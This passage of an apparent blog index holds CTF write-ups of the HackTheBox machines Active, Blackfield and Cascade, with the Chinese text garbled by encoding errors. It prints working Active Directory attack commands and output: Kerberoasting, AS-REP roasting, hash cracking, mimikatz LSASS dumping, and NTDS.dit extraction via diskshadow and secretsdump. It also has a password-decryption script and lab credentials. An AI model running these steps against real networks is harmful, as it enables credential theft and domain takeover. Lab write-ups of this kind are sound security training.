2018\rAll Users DHSrn 0 Tue Jul 14 13:06:44 2009\rDefault DHR 0 Tue Jul 14 14:38:21 2009\rDefault User DHSrn 0 Tue Jul 14 13:06:44 2009\rdesktop.ini AHS 174 Tue Jul 14 12:57:55 2009\rPublic DR 0 Tue Jul 14 12:57:55 2009\rSVC_TGS D 0 Sat Jul 21 23:16:32 2018\r5217023 blocks of size 4096. 284022 blocks available\rsmb: \\\u0026gt; cd SVC_TGS\rsmb: \\SVC_TGS\\\u0026gt; cd desktop\rsmb: \\SVC_TGS\\desktop\\\u0026gt; get user.txt\rgetting file \\SVC_TGS\\desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)\rsmb: \\SVC_TGS\\desktop\\\u0026gt; Privilege Escalation #\råœ¨Nmapä¸­å‘ç°å¼€å¯äº†KerberosæœåŠ¡\nGetUserSPNs è„šæœ¬èƒ½æ‰¾å‡ºå’Œæ™®é€šç”¨æˆ·è´¦æˆ·å…³è”çš„ SPNï¼Œå¹¶ä»¥ JtR (John the Ripper) å’Œ Hashcat å…¼å®¹çš„æ ¼å¼è¾“å‡ºã€‚\nç®€å•çš„è¯´ï¼Œå½“å‰ç”¨æˆ·é€šè¿‡ GetUserSPNs æŸ¥è¯¢æœåŠ¡å’Œç”¨æˆ·ä¹‹é—´çš„å…³è”ï¼Œå°¤å…¶æ˜¯ admin ç”¨æˆ·æ‰€ç®¡ç†çš„æœåŠ¡ã€‚å¦‚æœadminç”¨æˆ·çš„é…ç½®å­˜åœ¨æ¼æ´ï¼ˆä¾‹å¦‚ï¼Œç¦ç”¨äº†é¢„èº«ä»½éªŒè¯ï¼‰ï¼Œé‚£ä¹ˆå·¥å…·å°±èƒ½å¤ŸæŠ“å–åˆ°åŠ å¯†çš„å¯†ç å“ˆå¸Œï¼Œè¿›ä¸€æ­¥å¯ä»¥è¿›è¡Œå¯†ç ç ´è§£ã€‚\n[root@kali] /home/kali/Active â¯ impacket-GetUserSPNs -request active.htb/SVC_TGS:GPPstillStandingStrong2k18\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies ...........\r[-] CCache file is not found. Skipping...\r$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$710f30f9b647e40f3d5571b65223adf7$f40b9733880a7ef27fd7e80a1cb450dca57036d376c4cdccec590dd7a96b7445360c99f61872a50f1387be8be185759cb6406a4f8c2a99f6c68e695c7458242e64aa9295f9ff0481da1229d7f96d2745cdcd5a5bb0e3bc69b5de97xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx ä½¿ç”¨John the Ripperè¿›è¡Œç ´è§£\n[root@kali] /home/kali/Active â¯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt â\rUsing default input encoding: UTF-8\rLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rTicXXXXXXXXXXXXXXXX (?) ç„¶åä½¿ç”¨impacket-smbexecè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nåœ¨è¿™ä¸ªå·¥å…·ä¸‹ä¸èƒ½ä½¿ç”¨cdå‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥è¯»å–root.txt\nSummary #\rUserï¼šSMBæ–‡ä»¶æ³„éœ²ï¼Œç„¶åè¿›è¡ŒGPPå¯†ç ç ´è§£ï¼Œç”±äº5985ç«¯å£ï¼ˆwinrmï¼‰å¹¶æ²¡æœ‰æ‰“å¼€ï¼Œåœ¨SMBé‡Œæ‹¿åˆ°User.txt.\nRootï¼šé€šè¿‡Kerberoastæ”»å‡»ï¼Œè·å–åˆ°Administratorçš„å‡­è¯ï¼Œç ´è§£åé€šè¿‡smbexecè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nKerberoasting æ”»å‡»æ­¥éª¤ï¼š\næšä¸¾ SPNï¼šé¦–å…ˆåˆ—ä¸¾ç›®æ ‡åŸŸä¸­çš„æ‰€æœ‰ç”¨æˆ·å’ŒæœåŠ¡è´¦æˆ·ï¼Œæ‰¾åˆ°ä¸æœåŠ¡å…³è”çš„ SPNï¼ˆé€šå¸¸å¯ä»¥é€šè¿‡ GetUserSPNs å·¥å…·æ¥æšä¸¾ï¼‰ã€‚\nè¯·æ±‚æœåŠ¡ç¥¨è¯ï¼šæ”»å‡»è€…å‘ KDC å‘é€è¯·æ±‚ï¼Œè¦æ±‚è·å–ä¸æœåŠ¡è´¦æˆ·ç›¸å…³çš„ æœåŠ¡ç¥¨è¯ï¼ˆTGSï¼‰ã€‚\næå–æœåŠ¡ç¥¨è¯ï¼šKDC ä¼šè¿”å›åŠ å¯†çš„ æœåŠ¡ç¥¨è¯ï¼Œè¿™ä¸ªç¥¨è¯æ˜¯ç”¨æœåŠ¡è´¦æˆ·çš„ å¯†ç å“ˆå¸Œ åŠ å¯†çš„ã€‚\nç¦»çº¿ç ´è§£å¯†ç ï¼šæ”»å‡»è€…å°†æå–çš„ç¥¨è¯ï¼ˆé€šå¸¸æ˜¯åŠ å¯†çš„ RC4 å“ˆå¸Œï¼‰å¸¦å›å¹¶é€šè¿‡ç¦»çº¿ç ´è§£å·¥å…·ï¼ˆå¦‚ **John the Ripper** æˆ– **Hashcat**ï¼‰è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå°è¯•æ¢å¤å‡ºæœåŠ¡è´¦æˆ·çš„æ˜æ–‡å¯†ç ã€‚\nå€¼å¾—æ³¨æ„çš„æ˜¯æœåŠ¡ç¥¨æ®ä¼šä½¿ç”¨æœåŠ¡è´¦æˆ·çš„å“ˆå¸Œè¿›è¡ŒåŠ å¯†ï¼Œå› æ­¤ä»»ä½•é€šè¿‡èº«ä»½è®¤è¯çš„ç”¨æˆ·éƒ½èƒ½ä» TGS å¤„è¯·æ±‚ ST æœåŠ¡ç¥¨æ®ã€‚ç”±äºæœåŠ¡ç¥¨è¯æ˜¯ç”¨é“¾æ¥åˆ°è¯·æ±‚ SPN çš„å¸æˆ·çš„å“ˆå¸ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥å°è¯•ç ´è§£å¯†æ–‡ã€‚\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-active/","section":"Posts","summary":"","title":"HTB-Active","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Hard Nmap #\r[root@kali] /home/kali/Blackfield â¯ nmap Blackfield.htb -sV -T4\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows æŠŠBLACKFIELD.localæ·»åŠ åˆ°**/etc/hosts**\nControl Support #\rå¯ä»¥ä½¿ç”¨smbåŒ¿åè¿æ¥åˆ°è¿™ä¸ªç›®å½•ï¼Œå‘ç°äº†ä¸€äº›ç±»ä¼¼äºç”¨æˆ·åçš„ç›®å½•ï¼Œä½†æ˜¯é‡Œé¢éƒ½æ²¡ä¸œè¥¿\nå°†ç”¨æˆ·åå…¨éƒ¨æå–å‡ºæ¥\n[root@kali] /home/kali/Blackfield â¯ smbclient -N //BLACKFIELD.local/profiles$ -c \u0026#39;ls\u0026#39; | awk \u0026#39;{print $1}\u0026#39; \u0026gt; output.txt ä½¿ç”¨kerbruteè¿›è¡Œç”¨æˆ·æšä¸¾ï¼Œæ‰¾åˆ°å­˜åœ¨çš„ç”¨æˆ·\n[root@kali] /home/kali/Blackfield â¯ kerbrute userenum -d blackfield.local output.txt --dc 10.10.xx.xx -v -----\r[+] VALID USERNAME: audit2020@blackfield.local\r[+] VALID USERNAME: support@blackfield.local\r[+] VALID USERNAME: svc_backup@blackfield.local æŠŠè¿™ä¸‰ä¸ªç”¨æˆ·åå†™å…¥usernames.txtï¼Œæµ‹è¯•æ˜¯å¦å¼€å¯äº†Kerberosé¢„è®¤è¯\n[root@kali] /home/kali/Blackfield â¯ impacket-GetNPUsers -usersfile usernames.txt -no-pass -dc-ip \u0026#34;10.10.xx.xx\u0026#34; blackfield.local/ -debug\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket\r/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r[+] Trying to connect to KDC at 10.10.xx.xx:88\r[-] User audit2020 doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[+] Trying to connect to KDC at 10.10.xx.xx:88\r$krb5asrep$23$support@BLACKFIELD.LOCAL:aab0bba70e20145fc4a1eadbae74caf0$bf0551ac8cdc12daeade9a8e363771a63a4daa498959f53421eec21f3bf6d656352291672d3e790142453473e47a55fee161b37c0ec8ee321303d7c6afd757f6b95d0ee87a21becbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\r[+] Trying to connect to KDC at 10.10.xx.xx:88\r[-] User svc_backup doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set ä½¿ç”¨John the Ripperè¿›è¡Œç ´è§£å¾—åˆ°å¯†ç \n[root@kali] /home/kali/Blackfield â¯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rxxxxxxxxxxxxx ($krb5asrep$23$support@BLACKFIELD.LOCAL) ä½¿ç”¨supportçš„è´¦æˆ·æ£€æŸ¥SMBæƒé™\nå¹¶æ²¡æœ‰ä»»ä½•æ³„éœ²ï¼Œwinrmä¹Ÿç™»ä¸ä¸Šå»\nBloodhound #\r[root@kali] /home/kali/Blackfield â¯ bloodhound-python -u support -p \u0026#39;xxxxxxxxxxx\u0026#39; -d blackfield.local -ns 10.10.xx.xx -c All æ³¨æ„åˆ°supportå¯ä»¥ä¿®æ”¹audit2020çš„å¯†ç \n[root@kali] /home/kali/Blackfield â¯ bloodyAD --host \u0026#39;10.10.xx.xx\u0026#39; -d \u0026#39;blackfield.local\u0026#39; -u \u0026#39;support\u0026#39; -p \u0026#39;#00^BlackKnight\u0026#39; set password \u0026#39;audit2020\u0026#39; \u0026#39;123456ABC!\u0026#39; â\r[+] Password changed successfully! ä¿®æ”¹åä»ç„¶æ— æ³•ä½¿ç”¨evil-winrmï¼Œä¸è¿‡å¯ä»¥ç”¨audit2020çš„è´¦æˆ·ç™»å½•åˆ°SMBçš„forensicç›®å½•\nè¿™ä¸¤ä¸ªæ–‡ä»¶æ¯”è¾ƒå¯ç–‘\nlsass.zip:\nLSASS (Local Security Authority Subsystem Service) è¿›ç¨‹è´Ÿè´£ç®¡ç† Windows æ“ä½œç³»ç»Ÿä¸­çš„èº«ä»½éªŒè¯å’Œå®‰å…¨ç­–ç•¥ã€‚å®ƒå¤„ç†ç”¨æˆ·ç™»å½•ã€è´¦æˆ·éªŒè¯å’Œå¯†ç éªŒè¯ç­‰æ“ä½œã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿè®¿é—® LSASS çš„å†…å­˜è½¬å‚¨ï¼Œé€šå¸¸å¯ä»¥æå–å‡ºç”¨æˆ·å‡­æ®ï¼ˆå¦‚ NTLM å“ˆå¸Œã€Kerberos å¯†é’¥ç­‰ï¼‰ã€‚\nå¯èƒ½åŒ…å«èº«ä»½éªŒè¯ä¿¡æ¯ï¼šç”¨æˆ·åã€å¯†ç å“ˆå¸Œã€Kerberos å¯†é’¥ã€ç¥¨è¯ç­‰ã€‚\nwinlogon.zip:\nWinlogon è¿›ç¨‹æ¶‰åŠ Windows ç™»å½•è¿‡ç¨‹ï¼ŒåŒ…æ‹¬ç”¨æˆ·èº«ä»½éªŒè¯ã€ç™»å½•å±å¹•ã€éªŒè¯ç™»å½•å‡­è¯ç­‰ã€‚å®ƒå¤„ç†ç”¨æˆ·ç™»å½•æ—¶çš„èº«ä»½éªŒè¯æµç¨‹ã€‚\nå¯èƒ½åŒ…å«èº«ä»½éªŒè¯ä¿¡æ¯ï¼šç”¨æˆ·åã€ç™»å½•å‡­è¯ã€‚\nMimikatz #\ræŠŠlsass.zipè§£å‹å¾—åˆ°ä¸€ä¸ªlsass.DMPï¼Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥ä½¿ç”¨mimikatzè§£å¯†\nC:\\Users\\ASUS\\Desktop\\æ–°å»ºæ–‡ä»¶å¤¹\u0026gt;mimikatz.exe\r---\rmimikatz # sekurlsa::minidump lsass.DMP\rSwitch to MINIDUMP : \u0026#39;lsass.DMP\u0026#39;\rmimikatz # sekurlsa::logonpasswords full\rOpening : \u0026#39;lsass.DMP\u0026#39; file for minidump...\rAuthentication Id : 0 ; 406458 (00000000:000633ba)\rSession : Interactive from 2\rUser Name : svc_backup\rDomain : BLACKFIELD\rLogon Server : DC01\rLogon Time : 2020/2/24 2:00:03\rSID : S-1-5-21-4194615774-2175524697-3563712290-1413\rmsv :\r[00000003] Primary\r* Username : svc_backup\r* Domain : BLACKFIELD\r* NTLM : 9658d1dXXXXXXXXXXXXXXXXXXXXXXX\r* SHA1 : 463c13a9a31fc3252c68ba0a44f0221626a33e5c\r* DPAPI : a03cd8e9d30171f3cfe8caad92fef621\rtspkg :\rwdigest : æ‹¿åˆ°äº†svc_bakcupçš„NTLM hashï¼Œç„¶åä½¿ç”¨winrmç™»å½•æ‹¿åˆ°user.txt\nPrivilege Escalation #\råœ¨æ ¹ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªç•™è¨€\n*Evil-WinRM* PS C:\\\u0026gt; cat notes.txt\rMates,\rAfter the domain compromise and computer forensic last week, auditors advised us to:\r- change every passwords -- Done.\r- change krbtgt password twice -- Done.\r- disable auditor\u0026#39;s account (audit2020) -- KO.\r- use nominative domain admin accounts instead of this one -- KO.\rWe will probably have to backup \u0026amp; restore things later.\r- Mike.\rPS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt) æŸ¥çœ‹svc_backupçš„æ‰€å±ç»„æƒ…å†µï¼Œå‘ç°å±äºä¸€ä¸ªç‰¹æ®Šç»„BACKUP OPERATORS\nwhoamiæŸ¥çœ‹æƒé™\nå‚è€ƒä»¥ä¸‹æ–‡ç« \nBackup Operator Privilege Escalation \u0026lt; BorderGate\nDomain Escalation â€“ Backup Operator â€“ Penetration Testing Lab\nå°è¯•æœ¬åœ°ä¸‹è½½SAM\nreg save hklm\\sam c:\\Windows\\Tasks\\SAM\rreg save hklm\\system c:\\Windows\\Tasks\\SYSTEM å¹¶ä¸èƒ½ä½¿ç”¨è¿™ä¸ªhashï¼Œå°è¯•è·å–åˆ°Ntds.dit\nNtds.ditåŒ…æ‹¬ä½†ä¸é™äºæœ‰å…³åŸŸç”¨æˆ·ã€ç»„å’Œç»„æˆå‘˜èº«ä»½å’Œå‡­æ®ä¿¡æ¯ã€GPPç­‰ä¿¡æ¯ã€‚å®ƒåŒ…æ‹¬åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œä¸ºäº†è¿›ä¸€æ­¥ä¿æŠ¤å¯†ç å“ˆå¸Œå€¼ï¼Œä½¿ç”¨å­˜å‚¨åœ¨SYSTEMæ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­çš„å¯†é’¥å¯¹è¿™äº›å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ã€‚\nå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶è¢«å ç”¨äº†æ— æ³•å¤åˆ¶\nDiskShadow #\ræœ‰ä¸€ç§æ–¹å¼å°±æ˜¯ç»™é©±åŠ¨å™¨åˆ›å»ºå·å½±å‰¯æœ¬ï¼Œç„¶åæˆ‘ä»¬å°†èƒ½å¤Ÿå°† ntds.dit æ–‡ä»¶å¤åˆ¶å‡ºæ¥ï¼Œå› ä¸ºå®ƒä¸ä¼šè¢«æ­£åœ¨ä½¿ç”¨ã€‚\necho \u0026#34;set context persistent nowriters\u0026#34; | out-file ./diskshadow.txt -encoding ascii\recho \u0026#34;add volume c: alias temp\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append\recho \u0026#34;create\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append echo \u0026#34;expose %temp% z:\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append\rdiskshadow.exe /s c:\\temp\\diskshadow.txt ä¸Šé¢çš„å‘½ä»¤å®è´¨ä¸Šæ˜¯å‘Šè¯‰ diskshadow.exe åˆ›å»ºä¸€ä¸ª Cç›˜ çš„å‰¯æœ¬ï¼Œå°†å…¶å‘½åä¸º Zç›˜ å¹¶å…¬å¼€å®ƒï¼ˆä½¿å…¶ä½œä¸ºé©±åŠ¨å™¨è®¿é—®ï¼‰ã€‚\nå°†NTDS.ditè¿›è¡Œå¤‡ä»½æ“ä½œï¼Œå¹¶ä¸”ä¸‹è½½ä¸‹æ¥\nrobocopy /b Z:\\Windows\\NTDS C:\\temp NTDS.dit\rdownload C:\\temp\\NTDS.dit ä½¿ç”¨secretdumpè·å–hash\n[root@kali] /home/kali/Blackfield â¯ impacket-secretsdump -system system.bak -ntds ntds.dit LOCAL \u0026gt; results.txt æ‹¿åˆ°Administratorçš„hashåè¿›è¡Œç™»å½•ï¼Œæ‹¿åˆ°root.txt\nä¸ºä»€ä¹ˆè¿™å°±ç»“æŸäº†å‘¢ï¼Ÿä¸Šé¢ç»™çš„notes.txté‡Œè¯´äº†æœ€åçš„root.txtæ˜¯åŠ å¯†è¿‡çš„ã€‚\nSummary #\rUserï¼šSMBç”¨æˆ·åæ³„éœ²åè¿›è¡ŒKerberosç”¨æˆ·å­˜åœ¨éªŒè¯ï¼Œé€šè¿‡æœªå¼€å¯é¢„è®¤è¯çš„ç”¨æˆ·æ‹¿åˆ°hashï¼Œé€šè¿‡bloodhoundè¿›è¡Œåˆ†æå¯çŸ¥supportå¯ä¿®æ”¹auditçš„å¯†ç ï¼Œauditçš„SMBæœåŠ¡é‡Œå­˜åœ¨LSASSæ–‡ä»¶æ³„éœ²ï¼Œä½¿ç”¨Mimikatzè§£å¯†åæ‹¿åˆ°user.txt\nRootï¼šsvc_backupæ‰€å±ç»„æ˜¯å…·æœ‰å¤‡ä»½æƒé™çš„ï¼Œå› ä¸ºä¸èƒ½ç›´æ¥æ‹¿åˆ°ç³»ç»Ÿä¿¡æ¯æ–‡ä»¶ï¼Œå°è¯•ç›´æ¥å°†Cç›˜è¿›è¡Œå¤‡ä»½å¤„ç†ï¼Œé€šè¿‡å½±å­å·ç›˜è·å–åˆ°å¿…è¦çš„ç³»ç»Ÿæ–‡ä»¶ã€‚æˆ‘å°è¯•è¿‡äº†SYSTEMã€SECURITYã€SAMè¿™ä¸‰ä¸ªæ–‡ä»¶è¿›è¡Œsecretdumpï¼Œä¸è¿‡éƒ½ä¸èƒ½åˆ©ç”¨ï¼Œç»è¿‡æŸ¥è¯¢å¾—çŸ¥è¿™ä¸‰ä¸ªæ˜¯æå–æœ¬åœ°ç³»ç»Ÿä¸Šçš„ç”¨æˆ·è´¦æˆ·ä¿¡æ¯ï¼ˆæœ¬åœ°ç”¨æˆ·å’Œè®¡ç®—æœºè´¦æˆ·ï¼‰ï¼Œè€Œä¸æ˜¯åŸŸè´¦æˆ·ä¿¡æ¯ã€‚NTDS.ditåŒ…å«æ•´ä¸ªåŸŸæ§åˆ¶å™¨ä¸­åŸŸç”¨æˆ·å’Œè®¡ç®—æœºçš„è´¦æˆ·ä¿¡æ¯ã€ç»„æˆå‘˜èº«ä»½ã€æƒé™ç­‰ã€‚åŒ…æ‹¬åŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„å¯†ç å“ˆå¸Œã€‚æ¢å¥è¯è¯´æœ€å¼€å§‹çš„Adminçš„å¯†ç å“ˆå¸Œå¹¶ä¸ä½œç”¨äºåŸŸå†…å…¶ä»–æœºå™¨ï¼Œå› æ­¤åªèƒ½é€šè¿‡NTDSæ¥è·å–åˆ°åŸŸæ§ä¸Šçš„adminã€‚\næˆ‘çœ‹æœ‰ä¸€ä¸ªWriteupä¸Šæœ€åæ˜¯æ— æ³•ç›´æ¥è¯»å–root.txtçš„ï¼Œéœ€è¦ç”¨metasploitè¿æ¥æœ¨é©¬åï¼Œä½¿ç”¨cipherè§£å¯†ï¼Œä¼¼ä¹åº”è¯¥æ˜¯é¢„æœŸçš„ã€‚\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-blackfield/","section":"Posts","summary":"","title":"HTB-Blackfield","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali/Cascade â¯ nmap Cascade.htb -sV -T4 PORT STATE SERVICE VERSION\r53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r49154/tcp open msrpc Microsoft Windows RPC\r49155/tcp open msrpc Microsoft Windows RPC\r49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49158/tcp open msrpc Microsoft Windows RPC\r49165/tcp open msrpc Microsoft Windows RPC\rService Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows æŠŠcascade.localæ·»åŠ åˆ°**/etc/hosts**\nUserEnum #\r[root@kali] /home/kali/Cascade â¯ enum4linux -a cascade.local ----\ruser:[CascGuest] rid:[0x1f5]\ruser:[arksvc] rid:[0x452]\ruser:[s.smith] rid:[0x453]\ruser:[r.thompson] rid:[0x455]\ruser:[util] rid:[0x457]\ruser:[j.wakefield] rid:[0x45c]\ruser:[s.hickson] rid:[0x461]\ruser:[j.goodhand] rid:[0x462]\ruser:[a.turnbull] rid:[0x464]\ruser:[e.crowe] rid:[0x467]\ruser:[b.hanson] rid:[0x468]\ruser:[d.burman] rid:[0x469]\ruser:[BackupSvc] rid:[0x46a]\ruser:[j.allen] rid:[0x46e]\ruser:[i.croft] rid:[0x46f] ldapsearch #\r[root@kali] /home/kali/Cascade â¯ ldapsearch -x -b \u0026#34;dc=cascade,dc=local\u0026#34; -H ldap://cascade.local \u0026#34;(objectClass=*)\u0026#34; \u0026gt; ldapresult.txt åœ¨Ryanç”¨æˆ·ä¸‹çš„ä¿¡æ¯ä¸­å‘ç°æ—§å¯†ç (Legacy password)ï¼Œéœ€è¦Base64è§£å¯†\nSMB File Leak #\rä½¿ç”¨è¿™ä¸ªè´¦æˆ·æŸ¥çœ‹SMBï¼Œå‘ç°Dataå¯ä»¥è¯»å–\nsmb: \\IT\\Email Archives\\\u0026gt; ls\r. D 0 Wed Jan 29 02:00:30 2020\r.. D 0 Wed Jan 29 02:00:30 2020\rMeeting_Notes_June_2018.html An 2522 Wed Jan 29 02:00:12 2020\r6553343 blocks of size 4096. 1625364 blocks available æ‰¾åˆ°ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œå¤§æ¦‚æ˜¯è¯´ç”¨æˆ·åå’Œå¯†ç ä¸€æ ·\n-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is XXXXX (password is the same as the normal admin account password). åŒæ—¶åœ¨s.smithè¿™ä¸ªç›®å½•ä¸‹æ‹¿åˆ°ä¸€ä¸ªVNCæ–‡ä»¶\nCrack VNC Passwd #\rå¹¶ä¸”é‡Œé¢æœ‰å¯†ç å­—æ®µï¼Œéœ€è¦åå…­è¿›åˆ¶è§£å¯†ï¼Œå¹¶ä¸”é¡¶éƒ¨æ³¨æ„åˆ°TightVNCçš„å­—æ ·\nfrizb/PasswordDecrypts: Handy Stored Password Decryption Techniques è§£å¯†å¾—åˆ°å¯†ç \nç™»å½•æ‹¿åˆ°user.txt\nPrivilege Escalation #\rè¿˜æœ‰å¦ä¸€ä¸ªç”¨æˆ·arksvcå­˜åœ¨\n.NET Decompile #\rç”¨smithçš„è´¦æˆ·ç™»å…¥SMB\nå‘ç°ä¸€ä¸ªDBæ–‡ä»¶\nä¸‹è½½ä¸€ä¸ª.netåç¼–è¯‘å·¥å…·\ndnSpy/dnSpy: .NET debugger and assembly editor æŸ¥çœ‹åç¼–è¯‘çš„ä»£ç \nusing(SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader()) {\rsqliteDataReader.Read();\rstr = Conversions.ToString(sqliteDataReader[\u0026#34;Uname\u0026#34;]);\rstr2 = Conversions.ToString(sqliteDataReader[\u0026#34;Domain\u0026#34;]);\rstring text = Conversions.ToString(sqliteDataReader[\u0026#34;Pwd\u0026#34;]);\rtry {\rpassword = Crypto.DecryptString(text, \u0026#34;c4scadek3y654321\u0026#34;);\r} catch (Exception ex) {\rConsole.WriteLine(\u0026#34;Error decrypting password: \u0026#34; + ex.Message);\rreturn;\r}\r} æŸ¥çœ‹dllä¸­çš„ä»£ç åˆ†æï¼Œä¼¼ä¹æ˜¯AESåŠ å¯†æ–¹å¼\nè·å–åˆ°äº†ä¸€äº›å¿…è¦å‚æ•°\npassword = Crypto.DecryptString(text, \u0026#34;c4scadek3y654321\u0026#34;)\r---\raes.BlockSize = 128;\raes.KeySize = 128;\raes.IV = Encoding.UTF8.GetBytes(\u0026#34;1tdyjCbY1Ix49842\u0026#34;);\raes.Key = Encoding.UTF8.GetBytes(Key);\raes.Mode = CipherMode.CBC; å†™ä¸€ä¸ªpythonè„šæœ¬å³å¯è§£å¯†\nfrom Crypto.Cipher import AES\rfrom Crypto.Util.Padding import unpad\rfrom Crypto.Random import get_random_bytes\rimport base64\r# å¯†é’¥å’Œåˆå§‹åŒ–å‘é‡ (IV)\rkey = b\u0026#39;c4scadek3y654321\u0026#39; # 16 å­—èŠ‚ (128ä½) å¯†é’¥\riv = b\u0026#39;1tdyjCbY1Ix49842\u0026#39; # 16 å­—èŠ‚ IV\r# åŠ å¯†åçš„å¯†æ–‡ (base64 ç¼–ç )\rencrypted_text = \u0026#39;BQO5l5Kj9MdErXx6Q6AGOw==\u0026#39;\r# å°†å¯†æ–‡ä» base64 è§£ç æˆå­—èŠ‚\rciphertext = base64.b64decode(encrypted_text)\r# åˆ›å»º AES è§£å¯†å™¨\rcipher = AES.new(key, AES.MODE_CBC, iv)\r# è§£å¯†å¹¶å»é™¤å¡«å……\rtry:\rdecrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)\rdecrypted_text = decrypted_data.decode(\u0026#39;utf-8\u0026#39;)\rprint(\u0026#34;è§£å¯†åçš„æ–‡æœ¬:\u0026#34;, decrypted_text)\rexcept (ValueError, KeyError) as e:\rprint(\u0026#34;è§£å¯†å¤±è´¥:\u0026#34;, e) ç°åœ¨å°±æ‹¿åˆ°äº†arksvcçš„æƒé™\nBloodhound #\rarksvcå±äºAD RECYCLE BINè¿™ä¸ªç»„ï¼Œè¿™ä¸ªç»„æˆäºˆç”¨æˆ·è¯»å–å·²åˆ é™¤ç”¨æˆ·çš„æƒé™ä¿¡æ¯\nGet-ADObject -filter \u0026#39;isDeleted -eq $true\u0026#39; -includeDeletedObjects -Properties * æ‹¿åˆ°TempAdminçš„å¯†ç ï¼Œéœ€è¦base64è§£å¯†\nåœ¨ä¸Šé¢çš„SMBæ³„éœ²çš„é‚£ä¸ªHTMLæ–‡ä»¶é‡Œä¸æ˜¯è¯´è¿‡å—ï¼ŒTempAdminçš„å¯†ç å’Œç®¡ç†å‘˜çš„ä¸€æ¨¡ä¸€æ ·ï¼Œå› æ­¤å¯ä»¥ç›´æ¥ç™»å½•Administratorç”¨æˆ·ï¼Œæ‹¿åˆ°root.txt\nSummary #\rUserï¼šldapsearchå‘ç°æ—§å¯†ç å¯ä»¥ç™»å½•SMBï¼Œåœ¨SMBé‡Œæ‹¿åˆ°VNCå¯†ç æ–‡ä»¶ï¼Œè§£å¯†åç™»å½•æ‹¿åˆ°user.txt\nRootï¼šå°†**.NETåŠ å¯†å·¥å…·è¿›è¡Œåç¼–è¯‘ï¼Œåˆ¤æ–­å‡ºæ˜¯AESçš„CBCæ¨¡å¼åŠ 